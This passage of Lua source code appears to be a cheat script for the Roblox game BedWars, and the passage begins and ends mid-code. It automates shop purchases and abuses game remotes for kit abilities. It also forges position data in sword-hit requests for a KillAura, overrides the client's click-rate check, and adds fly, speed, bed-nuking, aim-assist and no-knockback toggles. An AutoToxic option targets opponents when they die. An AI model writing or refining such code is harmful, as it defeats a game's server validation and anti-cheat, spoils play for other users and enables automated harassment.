				},
				["shopId"] = NearestNpc.Name
			}
		}

		local Wool = {
			[1] = {
				["shopItem"] = {
					["currency"] = "iron",
					["itemType"] = "wool_white",
					["amount"] = 16,
					["price"] = 8,
					["category"] = "Blocks"
				},
				["shopId"] = NearestNpc.Name
			}
		}		

		local Bow = {
			[1] = {
				["shopItem"] = {
					["ignoredByKit"] = {
						[1] = "flower_bee"
					},
					["itemType"] = "wood_bow",
					["price"] = 24,
					["superiorItems"] = {
						[1] = "wood_crossbow",
						[2] = "tactical_crossbow"
					},
					["currency"] = "iron",
					["category"] = "Combat",
					["lockAfterPurchase"] = true,
					["spawnWithItems"] = {
						[1] = "wood_bow"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local EmeraldArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "emerald_chestplate",
					["price"] = 40,
					["customDisplayName"] = "Emerald Armor",
					["currency"] = "emerald",
					["category"] = "Combat",
					["nextTier"] = "",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "emerald_helmet",
						[2] = "emerald_chestplate",
						[3] = "emerald_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local DiamondArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "Diamond_chestplate",
					["price"] = 8,
					["customDisplayName"] = "Diamond Armor",
					["currency"] = "emerald",
					["category"] = "Combat",
					["nextTier"] = "diamond_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "diamond_helmet",
						[2] = "diamond_chestplate",
						[3] = "diamond_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}
		local IronArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "iron_chestplate",
					["price"] = 120,
					["customDisplayName"] = "Iron Armor",
					["currency"] = "iron",
					["category"] = "Combat",
					["nextTier"] = "diamond_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "iron_helmet",
						[2] = "iron_chestplate",
						[3] = "iron_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local LeatherArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "leather_chestplate",
					["price"] = 50,
					["customDisplayName"] = "Leather Armor",
					["currency"] = "iron",
					["category"] = "Combat",
					["nextTier"] = "iron_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "leather_helmet",
						[2] = "leather_chestplate",
						[3] = "leather_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local EmeraldSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "emerald_sword",
					["price"] = 20,
					["superiorItems"] = {
						[1] = ""
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local VoidSword = {
			[1] = {
				["shopItem"] = {
					["currency"] = "void_crystal",
					["itemType"] = "void_sword",
					["amount"] = 1,
					["price"] = 10,
					["category"] = "Void",
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher"
					},
					["lockAfterPurchase"] = true
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local DiamondSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "diamond_sword",
					["price"] = 4,
					["superiorItems"] = {
						[1] = "emerald_sword"
					},
					["currency"] = "emerald",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local IronSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "iron_sword",
					["price"] = 70,
					["superiorItems"] = {
						[1] = "diamond_sword"
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local StoneSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "stone_sword",
					["price"] = 20,
					["superiorItems"] = {
						[1] = "iron_sword"
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = NearestNpc.Name
			}
		}

		task.spawn(function()	
			if not HasItem("jade_hammer") and Settings.AutoKit.Value == true then
				PurchaseItem(JadeHammer)
			end

			if not HasItem("vacuum") and Settings.Aimbot.Value == true then
				PurchaseItem(GompyVacuum)
			end

			if not HasItem("lasso") and Settings.Aimbot.Value == true then
				PurchaseItem(Lasso)
			end
		end)

		task.spawn(function()
			if HasItem("diamond_sword") then
				PurchaseItem(EmeraldSword)
			end

			if HasItem("iron_sword") or HasItem("stone_sword") or HasItem("wood_sword") then
				PurchaseItem(DiamondSword)
			end

			if HasItem("stone_sword") and HasItem("iron_chestplate") then
				PurchaseItem(IronSword)
			end

			if HasItem("wood_sword") then
				PurchaseItem(StoneSword)
			end

			PurchaseItem(VoidSword)
		end)

		task.spawn(function()
			if HasItem("diamond_chestplate") then
				PurchaseItem(EmeraldArmor)
			end	

			if HasItem("iron_chestplate") then
				PurchaseItem(DiamondArmor)
			end	

			if HasItem("stone_sword") and not HasItem("iron_chestplate") and not HasItem("diamond_chestplate") and not HasItem("emerald_chestplate") then
				PurchaseItem(LeatherArmor)
			end	

			if HasItem("leather_chestplate") then
				PurchaseItem(IronArmor)
			end					
		end)

		task.spawn(function()
			if HasItem("iron_chestplate") and HasItem("iron_sword") and not HasItem("wood_bow") then
				PurchaseItem(Bow)
			end
		end)

		task.spawn(function()
			if HasItem("iron_chestplate") and HasItem("iron_sword") and HasItem("wood_bow") then
				PurchaseItem(Arrow)
			end
		end)

		task.spawn(function()
			if HasItem("iron_chestplate") and HasItem("iron_sword") and HasItem("wood_bow") and HasItem("arrow") and Settings.Scaffold.Value == true then
				PurchaseItem(Wool)
			end
		end)
	end	
end

local function AutoKit()
	local PetrifiedPlayer = FindPetrifiedPlayer()
	local NearestPlayer = FindNearestPlayer(math.huge)
	local NearestGhost = FindNearestGhost()
	local EquippedKit = GetEquippedKit()

	task.spawn(function()
		if NearestPlayer then
			if EquippedKit == "hannah" or nil then
				HannahPromptTriggerRemote:CallServer({victimEntity = NearestPlayer.Character, ["user"] = LocalPlayer})
			end
		end
	end)

	task.spawn(function()
		if PetrifiedPlayer then
			if EquippedKit == "miner" or nil then
				MinerRemote:FireServer({petrifyId = PetrifiedPlayer:GetAttribute("PetrifyId")})
			end
		end
	end)

	task.spawn(function()
		if EquippedKit == "angel" or nil then
			TrinitySetAngelTypeRemote:FireServer({angel = "Void"})
		end
	end)

	task.spawn(function()
		if NearestGhost then
			if EquippedKit == "ghost_catcher" or nil then
				CollectCollectableEntityRemote:FireServer({id = NearestGhost})
			end
		end
	end)
	
	task.spawn(function()
		if HasItem("jade_hammer") and (tick() - JadeHammerTick) > 4 then
			JadeHammerTick = tick()
			
			AbilityController:useAbility("jade_hammer_jump")
		end			
	end)
end

function IsAlive(Player)
	Player = Player or LocalPlayer

	if not Player.Character then return false end
	if not Player.Character:FindFirstChild("Humanoid") then return false end
	if Player.Character:GetAttribute("Health") <= 0 then return false end
	if not Player.Character.PrimaryPart then return false end	

	return true
end	

local function SwordHit(Entity, Weapon, NearestEntityDistance)
	local LocalPlayerHumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
	local EntityPrimaryPart = Entity.PrimaryPart
	local LookVector = CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector
	local Magnitude = (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude

	local SelfPosition

	task.spawn(function()
		task.spawn(function()
			if Settings.KillAura.ToolCheck == false then
				task.spawn(function()
					SwitchItem(Weapon.itemType)
				end)

				SelfPosition = LocalPlayerHumanoidRootPart.Position + LookVector * (Magnitude - 14)

				SwordHitRemote:FireServer({
					weapon = Weapon.tool,
					chargedAttack = {chargeRatio = 0},
					entityInstance = Entity,
					validate = {
						raycast = {
							cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
							cursorDirection = HashFunction(LookVector)
						},
						targetPosition = HashFunction(EntityPrimaryPart.Position),
						selfPosition = HashFunction(SelfPosition)
					}
				})
			end
		end)		

		task.spawn(function()
			if Settings.KillAura.ToolCheck == true then
				if HasItem(Weapon.itemType) then
					SelfPosition = LocalPlayerHumanoidRootPart.Position + LookVector * (Magnitude - 14)

					SwordHitRemote:FireServer({
						weapon = Weapon.tool,
						chargedAttack = {chargeRatio = 0},
						entityInstance = Entity,
						validate = {
							raycast = {
								cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
								cursorDirection = HashFunction(LookVector)
							},
							targetPosition = HashFunction(EntityPrimaryPart.Position),
							selfPosition = HashFunction(SelfPosition)
						}
					})
				end
			end
		end)		
	end)

	task.spawn(function()
		if Settings.KillAura.CustomAnimation == true and KillAuraAnimationCooldown == false then
			KillAuraAnimationCooldown = true

			PlayAnimation(Animations.KillAura)

			KillAuraAnimationCooldown = false
		end
	end)
end

function GetBow()
	local BestBow, BestBowDamage = nil, 0

	for i, v in next, GetInventory(LocalPlayer).items do
		if v.itemType:find("bow") then 
			local Item = ItemTable[v.itemType].projectileSource
			local Arrow = Item.projectileType("arrow")	
			local Damage = ProjectileMeta[Arrow].combat.damage

			if Damage > BestBowDamage then
				BestBowDamage = Damage
				BestBow = v
			end
		end
	end	

	return BestBow, BestBowDamage
end

local function InfFly()
	if InfiniteFlyValue == true and IsAlive(LocalPlayer) then
		SpoofedCamera = CreateSpoofedCamera()
		StartLevel = LocalPlayer.Character.Head.Position.Y

		if SpoofedCamera then
			SetCamera(SpoofedCamera)
		end

		LocalPlayer.Character.PrimaryPart.CFrame += Vector3.new(0, 1000000, 0)
		SpoofedCamera.Position = Vector3.new(SpoofedCamera.Position.X, StartLevel, SpoofedCamera.Position.Z)

		repeat 
			task.wait()

			SpoofedCamera.Position = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, SpoofedCamera.Position.Y + (FlyUp and 0.5 or 0) + (FlyDown and -0.5 or 0), LocalPlayer.Character.PrimaryPart.Position.Z)
			StartLevel = SpoofedCamera.Position.Y	
		until InfiniteFlyValue == false or not IsAlive(LocalPlayer)

		if InfiniteFlyValue == false or not IsAlive(LocalPlayer) then
			LocalPlayer.Character.PrimaryPart.Anchored = true
			LocalPlayer.Character.PrimaryPart.CFrame = SpoofedCamera.CFrame + Vector3.new(0, 5, 0)	
			SetCamera(LocalPlayer.Character)

			SpoofedCamera:Destroy()

			task.wait(0.025)

			WorkSpace.Gravity = 50
			LocalPlayer.Character.PrimaryPart.Anchored = false

			task.wait(1)

			WorkSpace.Gravity = 196.2
		end
	end	
end

local function Click()
	task.spawn(function()
		if KnitClientGotten == true then
			SwordController:swingSwordAtMouse()
		end	
	end)

	task.spawn(function()
		if KnitClientGotten == true and BlockPlacementController.blockPlacer then
			local MouseInformation = BlockPlacementController.blockPlacer.clientManager:getBlockSelector():getMouseInfo(0)

			if MouseInformation and MouseInformation.placementPosition == MouseInformation.placementPosition then
				BlockPlacementController:placeBlock(MouseInformation.placementPosition)
			end
		end
	end)	
end

local function Nuker(NearestBed, NearestOre)
	task.spawn(function()
		if NearestBed then
			NearestBedFound = true

			local NukerRaycastParameters = RaycastParams.new()
			local TargetBlock = nil

			NukerRaycastParameters.FilterType = Enum.RaycastFilterType.Exclude
			NukerRaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}
			NukerRaycastParameters.IgnoreWater = true

			local RaycastResult = WorkSpace:Raycast(NearestBed.Position + Vector3.new(0, 30, 0), Vector3.new(0, -35, 0), NukerRaycastParameters)

			task.spawn(function()
				if RaycastResult then
					if RaycastResult.Instance then
						TargetBlock = RaycastResult.Instance
					end

					if not RaycastResult.Instance then
						TargetBlock = NearestBed
					end				

					DamageBlockRemote:InvokeServer({
						blockRef = {
							blockPosition = GetServerPosition(TargetBlock.Position)
						},

						hitPosition = GetServerPosition(TargetBlock.Position),
						hitNormal = GetServerPosition(TargetBlock.Position)
					})
				end
			end)			

			task.spawn(function()
				local _, Value = Camera:WorldToScreenPoint(NearestBed.Position)

				CanSeeNearestBed = Value
			end)
		end
	end)

	task.spawn(function()
		if not NearestBed and NearestOre then		
			if Settings.Nuker.BreakOres == true then
				DamageBlockRemote:InvokeServer({
					blockRef = {
						blockPosition = GetServerPosition(NearestOre.Position)
					},

					hitPosition = GetServerPosition(NearestOre.Position),
					hitNormal = GetServerPosition(NearestOre.Position)
				})
			end
		end
	end)
end

local function FlyMe()
	local FlyGroundTime = tick()

	if FlyValue == true and IsAlive(LocalPlayer) then		
		task.spawn(function()
			local FlyHud, NumberDisplay, SliderDisplay = CreateFlyHud()

			repeat
				task.wait()

				if tick() - FlyGroundTime <= 2.3 then
					local MaxFlyTime = 2.3
					local FlyTime = DecimalRound(tick() - FlyGroundTime, 1)

					NumberDisplay.Text = FlyTime		

					local TweenInformation = TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)			
					local Tween = TweenService:Create(SliderDisplay, TweenInformation, {Size = UDim2.new(FlyTime / MaxFlyTime, 0, 1, 0)})

					Tween:Play()				
				end				

			until FlyValue == false or not IsAlive(LocalPlayer)

			FlyHud:Destroy()
		end)		

		task.spawn(function()
			FlyBodyVelocity = Instance.new("BodyVelocity")
			FlyBodyVelocity.MaxForce = Vector3.new(0, 9e9, 0)
			FlyBodyVelocity.Name = "FlyBodyVelocity"
			FlyBodyVelocity.Parent = LocalPlayer.Character.PrimaryPart

			FlyGroundTime = tick()

			repeat
				task.wait()

				if TouchingGround() then
					FlyGroundTime = tick()
				end

				if FlyValue == true and IsAlive(LocalPlayer) then
					FlyBodyVelocity.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, (FlyUp and 40 or 0) + (FlyDown and -40 or 0),LocalPlayer.Character.PrimaryPart.Velocity.Z)
				end

				task.spawn(function()
					if (tick() - FlyGroundTime) >= 2.3 then
						FlyGroundTime = tick()

						local FlyTeleportPosition = 0
						local FlyRaycastParameters = RaycastParams.new()

						FlyRaycastParameters.FilterType = Enum.RaycastFilterType.Include
						FlyRaycastParameters.FilterDescendantsInstances = {CollectionService:GetTagged("block")}

						local FlyRaycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, Vector3.new(0, -3000, 0), FlyRaycastParameters)

						if FlyRaycast and IsAlive(LocalPlayer) then 
							local Args = {LocalPlayer.Character.PrimaryPart.CFrame:GetComponents()}

							Args[2] = FlyRaycast.Position.Y + 1 + LocalPlayer.Character.Humanoid.HipHeight

							FlyTeleportPosition = LocalPlayer.Character.PrimaryPart.Position.Y

							LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(unpack(Args))

							task.spawn(function()								
								task.wait(0.15)

								if IsAlive(LocalPlayer) then 									
									local Args = {LocalPlayer.Character.PrimaryPart.CFrame:GetComponents()}	

									Args[2] = FlyTeleportPosition

									LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(unpack(Args))																		
								end	
							end)
						end
					end
				end)
			until FlyValue == false or not IsAlive(LocalPlayer)

			if LocalPlayer.Character.PrimaryPart:FindFirstChild("FlyBodyVelocity") then
				LocalPlayer.Character.PrimaryPart:FindFirstChild("FlyBodyVelocity"):Destroy()
				FlyGroundTime = tick()
			end
		end)
	end	
end

task.spawn(function()
	repeat task.wait() until GetMatchState() ~= 0

	if KnitClientGotten == true then
		local ZephyrUpdate = ZephyrController.updateJump

		ZephyrController.updateJump = function(self, Orb, ...)
			ZephyrOrb= IsAlive(LocalPlayer) and Orb or 0

			return ZephyrUpdate(self, Orb, ...)
		end
	end
end)

task.spawn(function()
	RunService.Heartbeat:Connect(function(Delta)
		local SpeedRaycastParameters = RaycastParams.new()

		SpeedRaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

		task.spawn(function()
			if Settings.Speed.Value == true and IsAlive(LocalPlayer) then			
				local SpeedValue = GetSpeed()
				local SpeedCFrame = LocalPlayer.Character.Humanoid.MoveDirection * SpeedValue * Delta

				local Raycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, SpeedCFrame, SpeedRaycastParameters)

				if not Raycast then
					LocalPlayer.Character.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame + SpeedCFrame
				end
			end
		end)			
	end)
end)

task.spawn(function()
	repeat task.wait() until GetMatchState() ~= 0

	task.spawn(function()
		for i, v in next, PlayerService:GetPlayers() do
			task.spawn(function()
				if IsAlive(v) then
					v.Character.Humanoid.HealthChanged:Connect(function(Health)
						if Settings.AutoToxic.Value == true and Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer then
							AutoToxic(v)
						end
					end)
				end	
			end)			

			task.spawn(function()
				v.CharacterAdded:Connect(function(Character)
					task.wait(0.3)

					local v = game.Players:FindFirstChild(Character.Name) or v

					if IsAlive(v) then
						v.Character.Humanoid.HealthChanged:Connect(function(Health)
							if Settings.AutoToxic.Value == true and Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer then
								AutoToxic(v)
							end
						end)
					end
				end)
			end)
		end
	end)	
end)

task.spawn(function()
	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
				FlyUp = true
			end

			if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
				FlyDown = true
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputEnded:Connect(function(Input)
			if Input.KeyCode == Enum.KeyCode.Space and not UserInputService:GetFocusedTextBox() then
				FlyUp = false
			end

			if Input.KeyCode == Enum.KeyCode.LeftShift and not UserInputService:GetFocusedTextBox() then
				FlyDown = false
			end
		end)
	end)	
end)

local CombatTab = CreateTab("Combat")
local BlatantTab = CreateTab("Blatant")
local UtilityTab = CreateTab("Utility")
local WorldTab = CreateTab("World")

task.spawn(function()
	local NoKnockBack, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "NoKnockBack", Settings.NoKnockBack.Value, function(CallBack)
		Settings.NoKnockBack.Value = CallBack

		local OldKnockBackDirection = KnockBackTable.kbDirectionStrength
		local OldKnockBackUp = KnockBackTable.kbUpwardStrength

		if Settings.NoKnockBack.Value == true then
			KnockBackTable.kbDirectionStrength = 0
			KnockBackTable.kbUpwardStrength = 0	
		end

		if Settings.NoKnockBack.Value == false then
			KnockBackTable.kbDirectionStrength = OldKnockBackDirection
			KnockBackTable.kbUpwardStrength = OldKnockBackUp
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.NoKnockBack.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.NoKnockBack.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.NoKnockBack.KeyBind then
					Settings.NoKnockBack.Value = not Settings.NoKnockBack.Value

					if Settings.NoKnockBack.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.NoKnockBack.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoClicker, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "AutoClicker", Settings.AutoClicker.Value, function(CallBack)
		Settings.AutoClicker.Value = CallBack

		local OldCpsFunction = nil

		task.spawn(function()
			if Settings.AutoClicker.Value == true and KnitClientGotten == true then
				SwordController.isClickingTooFast = function(self) 
					self.lastSwing = tick()

					return false 
				end
			end
		end)

		task.spawn(function()
			if Settings.AutoClicker.Value == false and KnitClientGotten == true then
				SwordController.isClickingTooFast = OldCpsFunction
			end
		end)	

		task.spawn(function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					task.spawn(function()
						if Settings.AutoClicker.ButterFlyClick == true then
							Click()

							task.wait((1 / Settings.AutoClicker.Cps) / 4)

							Click()

							task.wait(1 / Settings.AutoClicker.Cps)
						end	
					end)

					task.spawn(function()
						if Settings.AutoClicker.JitterClick == true then
							Click()

							task.wait((1 / Settings.AutoClicker.Cps) / 2)

							Click()			

							task.wait(1 / Settings.AutoClicker.Cps)
						end
					end)

					task.spawn(function()
						if Settings.AutoClicker.BlatantClick == true then
							task.wait(1 / Settings.AutoClicker.Cps)

							Click()
						end
					end)				
				end	
			until Settings.AutoClicker.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.AutoClicker.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoClicker.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoClicker.KeyBind then
					Settings.AutoClicker.Value = not Settings.AutoClicker.Value

					if Settings.AutoClicker.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AutoClicker.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(CombatTab, "Cps", Settings.AutoClicker.Cps, 100, LayoutOrder + 2, function(CallBack)
					Settings.AutoClicker.Cps = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "ButterFlyClick", Settings.AutoClicker.ButterFlyClick, LayoutOrder + 3, function(CallBack)
					Settings.AutoClicker.ButterFlyClick = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "BlatantClick", Settings.AutoClicker.BlatantClick, LayoutOrder + 4, function(CallBack)
					Settings.AutoClicker.BlatantClick = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "JitterClick", Settings.AutoClicker.JitterClick, LayoutOrder + 5, function(CallBack)
					Settings.AutoClicker.JitterClick = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AimAssist, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "AimAssist", Settings.AimAssist.Value, function(CallBack)
		Settings.AimAssist.Value = CallBack

		task.spawn(function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) then
					local NearestEntity = FindNearestEntity(Settings.AimAssist.Range)

					if NearestEntity then
						local LookVector = (NearestEntity.PrimaryPart.Position - Camera.CFrame.Position).unit

						Camera.CFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + LookVector)
					end
				end				
			until Settings.AimAssist.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.AimAssist.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AimAssist.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AimAssist.KeyBind then
					Settings.AimAssist.Value = not Settings.AimAssist.Value

					if Settings.AimAssist.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AimAssist.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(CombatTab, "Range", Settings.AimAssist.Range, 20, LayoutOrder + 1, function(CallBack)
					Settings.AimAssist.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local KillAura, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "KillAura", Settings.KillAura.Value, function(CallBack)
		Settings.KillAura.Value = CallBack

		task.spawn(function()
			repeat
				task.wait(0)

				if Settings.KillAura.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					local NearestEntity, NearestEntityDistance = FindNearestEntity(Settings.KillAura.Range)
					local Sword = GetSword()

					task.spawn(function()
						if not NearestEntity and Sword then
							PlayAnimation(Animations.Neutral)
						end
					end)

					task.spawn(function()
						if NearestEntity and Sword then
							SwordHit(NearestEntity, Sword, NearestEntityDistance)

							NearestEntityFound = true
						end
					end)

					task.spawn(function()
						if not NearestEntity then
							NearestEntityFound = false
						end
					end)
				end
			until not game	
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(CombatTab, Settings.KillAura.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.KillAura.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.KillAura.KeyBind then
					Settings.KillAura.Value = not Settings.KillAura.Value

					if Settings.KillAura.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.KillAura.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "CustomAnimation", Settings.KillAura.CustomAnimation, LayoutOrder + 2, function(CallBack)
					Settings.KillAura.CustomAnimation = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(CombatTab, "ToolCheck", Settings.KillAura.ToolCheck, LayoutOrder + 3, function(CallBack)
					Settings.KillAura.ToolCheck = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(CombatTab, "Range", Settings.KillAura.Range, 21, LayoutOrder + 4, function(CallBack)
					Settings.KillAura.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Aimbot, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "Aimbot", Settings.Aimbot.Value, function(CallBack)
		Settings.Aimbot.Value = CallBack

